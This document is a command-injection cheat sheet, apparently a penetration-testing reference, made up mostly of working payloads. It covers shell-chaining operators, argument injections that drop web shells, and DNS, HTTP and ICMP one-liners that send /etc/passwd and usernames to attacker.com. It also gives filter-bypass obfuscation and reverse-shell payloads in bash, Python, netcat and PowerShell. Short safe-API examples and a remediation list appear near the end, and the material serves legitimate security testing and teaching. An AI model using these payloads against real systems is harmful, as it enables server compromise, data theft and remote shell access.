# Command Injection

Command injection is a vulnerability that allows an attacker to execute arbitrary operating system commands on the server hosting an application, typically through unsanitized user input passed to system shell functions.

## OS Command Injection Operators

These operators chain or substitute commands within a shell context:

```bash
# Command separators (execute both commands)
; whoami                    # Unix: sequential execution
| whoami                    # Unix/Windows: pipe (executes both)
|| whoami                   # Unix/Windows: OR — runs if first fails
& whoami                    # Unix/Windows: background first, run second
&& whoami                   # Unix/Windows: AND — runs if first succeeds

# Command substitution (output inserted into parent command)
`whoami`                    # Unix: backtick substitution
$(whoami)                   # Unix: dollar-paren substitution

# Newline injection
%0a whoami                  # URL-encoded newline
%0d%0a whoami               # URL-encoded CRLF

# Windows-specific
%1a                         # SUB character — acts as command separator in some parsers
```

## Basic Injection Payloads

```bash
# Unix
127.0.0.1; whoami
127.0.0.1 | id
127.0.0.1 && cat /etc/passwd
$(whoami)
`id`

# Windows
127.0.0.1 & whoami
127.0.0.1 | type C:\Windows\win.ini
127.0.0.1 && ipconfig
```

## Argument Injection

When input is passed as an argument to a specific command (not a full shell):

```bash
# Inject flags/options
--help
--version
-v

# Curl argument injection
# If application runs: curl <user_input>
http://attacker.com -o /var/www/html/shell.php
-o /tmp/output http://attacker.com/shell.sh

# Wget argument injection
--post-file=/etc/passwd http://attacker.com
-O /var/www/html/shell.php http://attacker.com/shell.txt

# Git argument injection
--upload-pack="id"
--exec="id"

# Tar argument injection
--checkpoint=1 --checkpoint-action=exec=id

# SSH argument injection
-o ProxyCommand="whoami"

# Rsync argument injection
-e "sh -c id"

# Sendmail argument injection (PHP mail())
-X/var/www/html/shell.php
-OQueueDirectory=/tmp -X/var/www/html/shell.php
```

## Blind Command Injection

### Time-Based Detection

```bash
# Unix
; sleep 10
| sleep 10
& sleep 10
`sleep 10`
$(sleep 10)

# Windows
& ping -n 10 127.0.0.1
| timeout /t 10
& waitfor /t 10 pause
```

### Out-of-Band (OOB) Detection

```bash
# DNS exfiltration
; nslookup $(whoami).attacker.com
; host $(cat /etc/hostname).attacker.com
; dig $(id | base64).attacker.com

# HTTP exfiltration
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id | base64)
; python -c "import urllib.request; urllib.request.urlopen('http://attacker.com/'+open('/etc/passwd').read())"

# Windows OOB
& nslookup %username%.attacker.com
& certutil -urlcache -f http://attacker.com/%username% NUL
& powershell -c "Invoke-WebRequest http://attacker.com/$env:username"

# ICMP exfiltration (if DNS/HTTP blocked)
; ping -c 1 attacker.com
; xxd -p /etc/passwd | head -1 | xargs -I{} ping -c 1 -p {} attacker.com
```

## Filter Bypass Techniques

### Bypassing Space Filters

```bash
# Tab instead of space
cat%09/etc/passwd
;{cat,/etc/passwd}

# IFS (Internal Field Separator)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/}

# Variable assignment
X=$'\x20';cat${X}/etc/passwd
```

### Bypassing Command Keyword Filters

```bash
# Concatenation
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variable insertion
w$()hoami
w$@hoami
who$*ami

# Base64 encoding
echo d2hvYW1p | base64 -d | sh
bash<<<$(echo d2hvYW1p | base64 -d)

# Hex encoding
echo -e '\x77\x68\x6f\x61\x6d\x69' | sh
$(printf '\x77\x68\x6f\x61\x6d\x69')

# Octal encoding
$(printf '\167\150\157\141\155\151')

# Wildcard bypass
/b?n/ca? /et?/pas?wd
/b[i]n/c[a]t /e[t]c/p[a]sswd
/???/??t /???/??????

# Rev bypass
echo 'dimaohw' | rev | sh

# Environment variable substrings
${PATH:0:1}  # typically '/'
echo ${SHELL:0:1}${SHELL:5:1}${SHELL:1:1}  # build commands from env vars
```

### Bypassing Slash Filters

```bash
# Environment variable
${HOME:0:1}etc${HOME:0:1}passwd

# printf
$(printf '%s' '/etc/passwd')

# Here-string with variable
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

## Language-Specific Vectors

### PHP

```php
// Vulnerable functions
system($input);
exec($input);
shell_exec($input);
passthru($input);
popen($input, 'r');
proc_open($input, $descriptors, $pipes);
pcntl_exec($input);
`$input`;                    // backtick operator

// Example injection
// Code: system("ping -c 3 " . $_GET['ip']);
// Payload: ip=127.0.0.1;id

// Bypass disable_functions
// Use LD_PRELOAD, FFI, imap_open, mail() with argument injection
```

### Python

```python
# Vulnerable functions
os.system(input)
os.popen(input)
subprocess.call(input, shell=True)
subprocess.Popen(input, shell=True)
commands.getoutput(input)    # Python 2

# Example injection
# Code: os.system("ping -c 3 " + user_input)
# Payload: 127.0.0.1; id

# Safe alternative (shell=False with list)
subprocess.run(["ping", "-c", "3", user_input])  # Not injectable
```

### Node.js

```javascript
// Vulnerable functions
child_process.exec(input);
child_process.execSync(input);

// Safe alternatives (not injectable when used properly)
child_process.execFile('ping', ['-c', '3', input]);
child_process.spawn('ping', ['-c', '3', input]);

// Example injection
// Code: exec("ping -c 3 " + req.query.ip);
// Payload: ip=127.0.0.1;id

// Template literal injection
// Code: exec(`nslookup ${domain}`);
// Payload: domain=attacker.com;id
```

### Ruby

```ruby
# Vulnerable functions
system(input)
`#{input}`
exec(input)
%x(#{input})
IO.popen(input)
Open3.capture2(input)

# Safe: system with array arguments
system("ping", "-c", "3", input)  # Not injectable
```

### Java

```java
// Vulnerable
Runtime.getRuntime().exec("ping -c 3 " + input);
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "ping " + input);

// Safe: array form without shell
Runtime.getRuntime().exec(new String[]{"ping", "-c", "3", input});
```

## Testing Methodology

1. Identify inputs that might interact with OS commands (IP addresses, filenames, hostnames, URL parameters passed to server-side utilities)
2. Test basic operators: `;`, `|`, `&&`, `||`, `` ` ``, `$()`
3. If no output visible, use time-based detection with `sleep` or `ping`
4. If time-based works, escalate to OOB exfiltration (DNS, HTTP)
5. Test for filter bypass if basic payloads are blocked
6. Identify the underlying OS (Unix vs Windows) and tailor payloads
7. Attempt to establish a reverse shell for full access

## Reverse Shell Payloads

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/sh ATTACKER PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"
```

## Remediation Checks

- Avoid calling OS commands from application code when possible
- Use language-native libraries instead of shell commands (e.g., socket library instead of ping)
- If OS commands are necessary, use parameterized/array-form APIs (`execFile`, `spawn`, `subprocess.run` with `shell=False`)
- Validate input against a strict allowlist (e.g., IP address regex)
- Never pass user input directly to a shell interpreter
- Apply least privilege to the application's OS user account
